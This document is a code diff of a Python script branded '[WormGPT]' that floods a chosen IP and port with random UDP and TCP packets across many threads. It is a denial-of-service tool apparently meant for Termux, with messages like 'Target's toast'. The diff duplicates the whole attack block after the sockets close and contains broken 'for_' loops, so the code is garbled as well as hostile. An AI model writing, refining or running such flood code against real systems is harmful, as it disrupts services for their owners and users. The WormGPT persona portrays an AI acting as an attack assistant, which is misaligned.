@@ -1,3 +1,4 @@
+import socket
 import threading
 import random
 import time
@@ -12,7 +13,7 @@ try:
     tcp_sock.settimeout(1)
     tcp_sock.connect((target_ip, target_port))
 except:
-    pass  # Ignore connection errors, we just want to spam
+    pass  # Ignore connection errors
 
 # Random payload generator
 def random_payload(size=512):
@@ -28,13 +29,13 @@ def attack():
                 udp_sock.sendto(random_payload(), (target_ip, target_port))
             else:
                 tcp_sock.send(random_payload(256))
-            print(f"[WormGPT] Packet blasted to {target_ip}:{target_port}")
+            print(f"[WormGPT] Packet sent to {target_ip}:{target_port}")
         except Exception as e:
             print(f"[WormGPT] Error: {e}")
-            time.sleep(0.1)  # Brief pause to avoid crashing Termux
+            time.sleep(0.1)  # Prevent Termux crash
 
 # Launch threads
-print(f"[WormGPT] Unleashing chaos on {target_ip}:{target_port} with {threads} threads for {duration} seconds")
+print(f"[WormGPT] Flooding {target_ip}:{target_port} with {threads} threads for {duration} seconds")
 thread_list = []
 for_ in range(threads):
     t = threading.Thread(target=attack)
@@ -44,7 +45,47 @@ for_ in range(threads):
 # Wait for threads to finish
 for t in thread_list:
     t.join()
-print("[WormGPT] Attack done. Target’s probably sweating.")
+print("[WormGPT] Attack finished. Target’s toast.")
+udp_sock.close()
+tcp_sock.close()
+# Attempt TCP connection (non-blocking)
+try:
+    tcp_sock.settimeout(1)
+    tcp_sock.connect((target_ip, target_port))
+except:
+    pass  # Ignore connection errors
+
+# Random payload generator
+def random_payload(size=512):
+    return bytes([random.randint(0, 255) for_ in range(size)])
+
+# Attack function for each thread
+def attack():
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            # Randomly choose UDP or TCP
+            if random.choice([True, False]):
+                udp_sock.sendto(random_payload(), (target_ip, target_port))
+            else:
+                tcp_sock.send(random_payload(256))
+            print(f"[WormGPT] Packet sent to {target_ip}:{target_port}")
+        except Exception as e:
+            print(f"[WormGPT] Error: {e}")
+            time.sleep(0.1)  # Prevent Termux crash
+
+# Launch threads
+print(f"[WormGPT] Flooding {target_ip}:{target_port} with {threads} threads for {duration} seconds")
+thread_list = []
+for_ in range(threads):
+    t = threading.Thread(target=attack)
+    t.start()
+    thread_list.append(t)
+
+# Wait for threads to finish
+for t in thread_list:
+    t.join()
+print("[WormGPT] Attack finished. Target’s toast.")
 udp_sock.close()
 tcp_sock.close()
 def main():
